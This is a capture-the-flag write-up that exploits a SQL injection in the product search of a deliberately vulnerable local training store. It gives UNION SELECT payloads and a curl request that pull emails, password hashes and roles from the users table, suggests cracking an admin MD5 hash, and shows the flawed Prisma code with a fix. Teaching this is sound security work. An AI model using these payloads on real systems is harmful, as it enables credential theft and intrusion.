---
author: kOaDT
authorGithubUrl: https://github.com/kOaDT
authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
pubDatetime: 2026-02-15T00:29:00Z
title: "Exploiting a Product Search SQL Injection"
slug: product-search-sql-injection
draft: false
tags:
  - writeup
  - sql-injection
  - ctf
description: How to exploit a vulnerability in a tiny search box to quietly expose an entire database.
---

## Introduction

This writeup documents the exploitation of a SQL injection vulnerability located in the product search functionality. The vulnerability allows direct manipulation of a backend SQL query through unsanitized user input, ultimately enabling unauthorized data extraction and triggering a flag disclosure within the lab environment.

## Table of contents

- [Lab setup](#lab-setup)
- [Feature overview and attack surface](#feature-overview-and-attack-surface)
- [Exploitation procedure](#exploitation-procedure)
- [Flag retrieval](#flag-retrieval)
- [Vulnerable code analysis](#vulnerable-code-analysis)
- [Remediation](#remediation)

---

## Lab setup

The vulnerable environment can be initialized locally using the provided CLI utility.

```bash
npx create-oss-store oss-store
cd oss-store
npm run dev
```

The initialization process installs dependencies, creates and migrates the database schema, injects seed data, and starts the development server on port 3000.

After the server has started, access the application at:

```
http://localhost:3000
```

![OopsSec Store homepage interface](../../assets/images/product-search-sql-injection/homepage-interface.png)

## Feature overview and attack surface

The attack surface is the product search feature accessible through the navigation header. The interface provides a text input that allows users to search products by name or description.

From a network perspective, the frontend issues requests to the following endpoint:

```
/api/products/search?q=<search_term>
```

The backend dynamically builds a SQL query using the value of the `q` parameter. Because the query string is constructed through direct interpolation, any characters supplied by the client become part of the executable SQL statement.

![Product search input field](../../assets/images/product-search-sql-injection/search-page-ui.png)

This design creates a classical SQL injection vector where an attacker can terminate the intended query context and append additional clauses such as `UNION SELECT`.

## Exploitation procedure

### Initial behavior verification

Navigate to the search page and submit a benign value such as `fresh`.

The response should contain product results, confirming that the endpoint functions normally and that the parameter is actively processed.

### Injection probing

Enter the following payload into the search field:

```
' UNION SELECT 1,2,3,4,5--
```

Submitting this request tests whether the application allows modification of the query structure. If the response renders without server-side validation errors, it indicates that the SQL syntax has been successfully altered.

![SQL injection payload submitted in search box](../../assets/images/product-search-sql-injection/sql-injection-test.png)

### UNION-based data extraction

To retrieve data from another table, submit the following payload:

```
DELIVERED' UNION SELECT id, email, password, role, addressId FROM users--
```

The injected statement merges rows from the `users` table into the product query result set. Because the application does not validate column origins, the backend returns data that was never intended to be exposed through this endpoint.

![Network response showing manipulated query results](../../assets/images/product-search-sql-injection/api-response-union-select.png)

The same request can be reproduced via curl:

```bash
curl "http://localhost:3000/api/products/search?q=DELIVERED%27%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20role%2C%20addressId%20FROM%20users--"
```

## Vulnerable code analysis

The root cause of the vulnerability is direct string concatenation within a raw SQL query.

```ts
const sqlQuery = `
  SELECT 
    id,
    name,
    description,
    price,
    "imageUrl"
  FROM products
  WHERE name LIKE '%${query}%' OR description LIKE '%${query}%'
  ORDER BY name ASC
  LIMIT 50
`;

const results = await prisma.$queryRawUnsafe(sqlQuery);
```

Several issues are present:

1. The `query` parameter is interpolated directly into the SQL string.
2. The use of `$queryRawUnsafe` bypasses Prisma’s parameterization safeguards.
3. No escaping or validation is applied to special SQL characters such as single quotes or comment delimiters.

When the payload contains:

```
DELIVERED' UNION SELECT ...
```

the injected quote terminates the `LIKE` clause, and the subsequent UNION statement becomes part of the executable SQL instruction. Because the database user has read access to multiple tables, the attacker can retrieve unrelated records.

This flaw corresponds to [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html).

## Remediation

The primary remediation strategy is to avoid constructing SQL queries through string interpolation. Prisma provides a safe abstraction that automatically parameterizes user input.

A secure implementation would resemble the following:

```ts
const results = await prisma.product.findMany({
  where: {
    OR: [
      { name: { contains: query, mode: "insensitive" } },
      { description: { contains: query, mode: "insensitive" } },
    ],
  },
});
```

This approach ensures that user input is treated strictly as data rather than executable SQL syntax.

Additional defensive measures include:

- With Prisma, if you need to write raw SQL queries, use `queryRaw`. Never use `queryRawUnsafe`.
- When using MySQL without an ORM, always rely on prepared statements to prevent SQL injection risks.
- Applying least-privilege database permissions to reduce the blast radius of injection flaws.
- Implementing centralized validation for query parameters to prevent malformed input from reaching database layers.
- Logging anomalous query patterns to support detection of injection attempts.

Even when using ORMs, any fallback to raw SQL should employ parameter placeholders rather than string concatenation to preserve query integrity.

## Go further

At this stage, the database leakage reveals additional sensitive records, including an administrator email address associated with an MD5 password hash. Although MD5 is considered cryptographically broken and unsuitable for password storage, its presence creates an opportunity for further privilege escalation attempts through offline hash cracking or credential reuse testing. Gaining administrative access would expand the attack surface and potentially expose additional restricted endpoints where other flags may be retrieved.
